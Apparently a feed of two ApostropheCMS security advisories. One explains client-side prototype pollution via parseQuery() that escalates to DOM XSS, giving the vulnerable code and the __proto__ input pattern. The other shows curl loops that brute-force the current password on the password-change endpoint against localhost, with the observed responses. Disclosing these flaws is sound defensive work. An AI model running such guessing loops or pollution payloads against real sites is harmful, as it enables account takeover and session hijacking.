items.summary: SummaryThe client-side helper apos.http.parseQuery() in ApostropheCMS builds a nested objectfrom a URL query string without sanitizing the keys __proto__, constructor, orprototype. Parsing an attacker-controlled query string therefore writes arbitraryproperties onto Object.prototype (client-side prototype pollution).ApostropheCMS's admin UI calls this parser with window.location.search on everyauthenticated page load (the admin context bar's data() initializer). Because the adminUI is built on Vue, a polluted, enumerable property on Object.prototype is then picked upby Vue's standard element-mount routine and written to the DOM as an element property,turning the prototype pollution into DOM-based XSS in the victim's authenticated session.The escalation gadget is a well-known, general Vue behavior; the novel,reportable defect is the unsanitized parseQuery source together with the authenticatedtrigger, both of which are ApostropheCMS code.Any user who can get any logged-in user (from the lowest-privileged guest role up to the highest-privileged admin role) toopen a crafted URL can execute arbitrary JavaScript in that user's session.This is distinct from CVE-2026-53609 (server-side prototype pollution viaapos.util.set() / $pullAll, fixed in 4.31.0): different side (client vs server),different code path, and the vulnerable code here is present in the current release.PackageEcosystem: npmPackage: apostropheAffected versions: all 4.x releases, 4.0.0 through 4.32.2 (current latest).Verified by inspecting the published npm tarballs: apostrophe@4.0.0 already contains thevulnerable descent (parentKey = 'root') with no __proto__/constructor/prototypefiltering, and apostrophe@4.32.2 is unchanged in this respect. The vulnerableparseQuery() logic was introduced in commit 0255086bf (2020-11-12), well before the 4.0version, so ApostropheCMS 3.x is also affected (the same code ships in 3.x at the olderbuild path modules/@apostrophecms/util/ui/public/2-http.js).Patched versions: none at time of writing.DetailsThe issue has three parts. Parts 1 and 2 are ApostropheCMS code and constitute thereportable vulnerability. Part 3 is the escalation gadget, which is standard Vue behaviorand is included for completeness.1. The pollution primitive: source (ApostropheCMS)modules/@apostrophecms/util/ui/src/http.js, function apos.http.parseQuery()(line ~301) and its inner patch() (lines ~317–354):function patch(key, value) {  let match;  let parentKey = 'root';  let context = data;                    // data = {}  (ordinary object)  key = decodeURIComponent(key);  const path = key.split('[');  path.forEach(function(subKey) {    if (subKey === ']') {      /* array handling */    } else if (subKey.match(/^\d+]/)) {      /* numeric index handling */    } else {      match = subKey.replace(']', '');      if (!context[parentKey]) {         // (A) truthy check, not an own-property check        context[parentKey] = {};      }      context = context[parentKey];      // (B) descends into whatever this resolves to      parentKey = match;    }  });  value = (value === null) ? value : decodeURIComponent(value);  if (Array.isArray(context[parentKey])) {    context[parentKey].push(value);  } else if (context[parentKey] !== undefined) {    context[parentKey] = [ context[parentKey], value ];  } else {    context[parentKey] = value;          // (C) assignment onto the resolved object  }}No __proto__, constructor, or prototype key is rejected. Walking the input__proto__[x]=v:Segment __proto__: at (A), context['__proto__'] resolves to the object'sinherited prototype (truthy), so the {} initializer is skipped; at (B), contextbecomes Object.prototype.Segment x: at (C), Object.prototype['x'] = v.The truthy guard at (A) (rather than an own-property check) is what allows the descentinto the inherited prototype. Because the assignment at (C) is an ordinary propertywrite, the resulting Object.prototype property is enumerable,which matters for thegadget (3).2. The trigger: reached on every authenticated page load (ApostropheCMS)modules/@apostrophecms/admin-bar/ui/apos/components/TheAposContextBar.vue. The component'sdata() initializer (line ~64) runs when the admin context bar mounts (i.e. on everyauthenticated page load), and passes the raw query string straight into the vulnerableparser:data() {  const query = apos.http.parseQuery(location.search);   // <- attacker-controlled -> (1) pollution, on mount  const draftMode = query.aposMode || 'published';  // ...}The same component's refresh() method (line ~606) passes window.location.search intoparseQuery() again on admin-bar refresh events, and folds it into doc._url(re-parsed inside apos.http.remote()), providing additional trigger points.The admin context bar mounts only when a session is present and the admin bundle loads, sonone of this executes for anonymous visitors, which is why the pollution is observed onlywhen logged in. items.title: [apostrophe] ApostropheCMS: No Attempt Throttling on Authenticated Password-Change Endpoint Enables Unlimited Current-Password Guessing
items.summary: SummaryThe self-service password-change endpoint verifies the current password but does not use the login module’s failed-attempt counter, throttle, delay, or lockout mechanism. An attacker with a valid authenticated session can submit repeated guesses for the current password without receiving a lockout or throttle response.Exact source pathpackages/apostrophe/modules/@apostrophecms/settings/index.js:621-664The password-change route is:PATCH /api/v1/@apostrophecms/settings/passwordThe route calls the password verifier directly through:await self.handleProtectedSubform(req, subform, req.body );The password verification path is:packages/apostrophe/modules/@apostrophecms/settings/index.js:514-542async handlePasswordProtectedSubform(req, subform, payload) {  try {    await self.apos.user.verifyPassword(req.user, payload.passwordCurrent);  } catch (e) {    throw self.apos.error(      'forbidden',      'apostrophe:passwordCurrentError',      { path: 'passwordCurrent' }    );  }  return subform;}The verifier itself does not increment the login-attempt cache or enforce a delay:packages/apostrophe/modules/@apostrophecms/user/index.js:412-487By contrast, the login route explicitly calls checkLoginAttempts and addLoginAttempt in:packages/apostrophe/modules/@apostrophecms/login/index.js:831-929Local PoCThe test used a disposable authenticated guest session against:Request:PATCH /api/v1/@apostrophecms/settings/password HTTP/1.1Host: 127.0.0.1:3000Cookie: <redacted-authenticated-session>Content-Type: application/json{  "password": "new-temporary-password",  "passwordRepeat": "new-temporary-password",  "passwordCurrent": "definitely-wrong-current-password"}Equivalent command:for i in 1 2 3 4 5; do  time curl -i -sS \    -b /path/to/temporary-session-cookie-jar.txt \    -X PATCH \    'http://127.0.0.1:3000/api/v1/@apostrophecms/settings/password' \    -H 'Content-Type: application/json' \    --data-raw '{      "password": "new-temporary-password",      "passwordRepeat": "new-temporary-password",      "passwordCurrent": "definitely-wrong-current-password"    }'doneObserved responseAll five attempts returned the same immediate validation response:HTTP/1.1 403 ForbiddenContent-Type: application/json; charset=utf-8{  "name": "forbidden",  "data": {    "path": "passwordCurrent"  },  "message": "apostrophe:passwordCurrentError"}Observed timings were approximately:Attempt 1: 231 msAttempt 2: 232 msAttempt 3: 226 msAttempt 4: 229 msAttempt 5: 226 msNo attempt returned a throttle response, lockout message, Retry-After header, or rate-limit status.seq 1 20 | xargs -P 20 -I{} sh -c   "curl --max-time 15 -sS     -o /tmp/password-attempt-{}.body     -w '%{http_code}\n'     -b /path/to/temporary-session-cookie-jar.txt     -X PATCH     'http://127.0.0.1:3000/api/v1/@apostrophecms/settings/password'     -H 'Content-Type: application/json'     --data-raw '{"password":"new-temporary-password-{}","passwordRepeat":"new-temporary-password-{}","passwordCurrent":"wrong-current-{}"}'"Result:20 requests -> HTTP 403 Forbidden0 requests -> HTTP 429 Too Many Requests0 requests -> lockout responseThe valid password continued to authenticate afterward:POST /api/v1/@apostrophecms/login/login HTTP/1.1HTTP/1.1 200 OKImpactAn attacker who has obtained or hijacked a valid authenticated session can repeatedly guess the current password through the password-change endpoint. Each guess receives a normal response, and the route does not apply the login throttle or lockout mechanism.If the current password is weak or reused, this can allow the attacker to pass the current-password check and replace the account password. The attacker would then be able to log in after the password change. The attack requires a valid authenticated session and does not work anonymously.SeverityMedium, subject to the application’s session-threat model. The prerequisite of an already authenticated session limits exploitability, but successful guessing leads directly to account takeover through password replacement.Referenceshttps://github.com/apostrophecms/apostrophe/security/advisories/GHSA-653j-g8j7-gh54https://github.com/apostrophecms/apostrophe/commit/9500b8b0e1d630d5e07fbb5fd2c25ed0943845cehttps://github.com/apostrophecms/apostrophe/commit/f84fd41cbf6c22eb8d0008fc9c25df1f7130b350https://github.com/apostrophecms/apostrophe/releases/tag/apostrophe@4.33.0https://github.com/advisories/GHSA-653j-g8j7-gh54
